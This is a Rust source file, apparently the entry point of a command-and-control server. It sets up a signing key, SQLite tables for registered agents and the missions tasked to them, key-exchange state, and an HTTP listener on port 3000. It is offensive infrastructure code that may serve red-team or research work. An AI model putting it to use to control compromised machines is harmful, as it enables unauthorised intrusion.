use std::{
    collections::HashMap,
    sync::{Arc, Mutex},
};

use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::crypto::{self, SigningKey};
use error::C2Result;
use tower_http::trace::TraceLayer;
use tracing::info;

mod error;
mod routes;
mod services;

pub const IDENTITY: &str = include_str!("../../c2.id");

#[derive(Clone)]
pub struct C2State {
    pub signing_key: SigningKey,
    pub conn: Arc<Mutex<rusqlite::Connection>>,
    pub ephemeral_private_keys: Arc<Mutex<HashMap<i32, crypto::KeyExchangePrivateKey>>>,
}

#[tokio::main]
async fn main() -> C2Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::DEBUG)
        .init();
    info!(" ░▒▓██████▓▒░░▒▓███████▓▒░ ");
    info!("░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░");
    info!("░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░       ░▒▓██████▓▒░ ");
    info!("░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       ");
    info!(" ░▒▓██████▓▒░░▒▓████████▓▒░");

    let signing_key = crypto::get_signing_key_from(
        BASE64_STANDARD
            .decode(IDENTITY)
            .unwrap()
            .as_slice()
            .try_into()
            .unwrap(),
    );

    let conn = rusqlite::Connection::open("c2.db")?;

    conn.execute("PRAGMA foreign_keys = ON", [])?;

    conn.execute(
        "CREATE TABLE IF NOT EXISTS agents (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        identity BLOB NOT NULL,
        platform TEXT NOT NULL,
        created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
        last_seen_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    )",
        [],
    )?;

    conn.execute(
        "CREATE TABLE IF NOT EXISTS missions (
        id INTEGER PRIMARY KEY,
        agent_id INTEGER NOT NULL,
        task STRING NOT NULL,
        result STRING,
        issued_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
        completed_at TIMESTAMP,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    )",
        [],
    )?;

    let ephemeral_private_keys = HashMap::new();

    // build our application with a single route
    let app = routes::init_router()
        .layer(TraceLayer::new_for_http())
        // .layer(DefaultBodyLimit::max(2048))
        .with_state(C2State {
            signing_key,
            conn: Arc::new(Mutex::new(conn)),
            ephemeral_private_keys: Arc::new(Mutex::new(ephemeral_private_keys)),
        });

    // run our app with hyper, listening globally on port 3000
    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await?;
    Ok(axum::serve(listener, app).await?)
}
